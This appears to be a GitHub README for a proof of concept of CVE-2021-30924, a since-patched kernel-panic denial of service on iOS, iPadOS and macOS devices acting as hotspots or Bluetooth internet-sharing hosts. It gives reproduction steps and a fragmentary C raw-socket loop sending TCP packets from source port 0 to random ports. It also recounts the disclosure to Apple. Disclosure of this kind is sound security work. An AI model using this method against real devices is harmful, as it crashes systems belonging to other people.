# CVE-2021-30924. PoC for iOS, macOS, iPadOS (DoS)

This repo demonstrates the method to cause kernel panic (DoS) on iOS, macOS, iPadOS devices by sending 2+ TCP/UDP packets from attacker device via apple device hotspot net to external network.
The issue was discovered at <DATE>, was reproduced on <list of devices> at september 2021 and was reported to Apple at 14 september.

UPD:
- 25 Oct 2021: Apple has fixed the issue for iOS and iPadOS 15.1 and macOS 12.0 without any kind of public acknowledgement to our team.
- 18 Nov 2021: Apple mentioned our names in [CVE-2021-30924](https://support.apple.com/en-us/HT212869) only for macOS, without any other communication with our team.
    
## Issue
Kernel panic after send 2+ TCP/UDP packets by attacker device via apple device hotspot net to external network

## Steps
### iPhone, iPad
1) Switch into hotspot mode
1) Attacker connect to iPhone network
1) Attacker send 2+ TCP/UDP packet from source port 0 to different destination ports in external network.
1) Kernel panic
### iMac, Mac, MacBook
1) Require internet access on device
1) On "Internet sharing" (on Bluetooth PAN) on victim apple device
1) Bluetooth pair attacker and victim apple device
1) Attacker connect to internet via apple device
1) Attacket send 2+ TCP/UDP packet from source port 0 to different destination ports in external network.
1) Kernel panic



## Here is a short proof of concept.
We used raw sockets to form a custom package and send requests from port 0.

```с
...
    tcph->source = htons (0); //here we specify the output port 0
...
    while (1)
    {
        tcph->dest = htons (rand()); //here we specify the input port random
        if (sendto (s, datagram, iph->tot_len ,    0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
        {
            perror("sendto failed");
        }
        else
        {
            printf ("Packet Send. Length : %d \n" , iph->tot_len);
        }
        sleep(1);
    }
...
```
After sending 2 packets(print "Packet Send..."), DoS is called and elf execution can be terminated.

## Requirements
Linux-based systems. (tested on Ubuntu 21.04)

## Our links
Elaman Iskakov - @darling_x0r
Alexey Katkov - @watman27
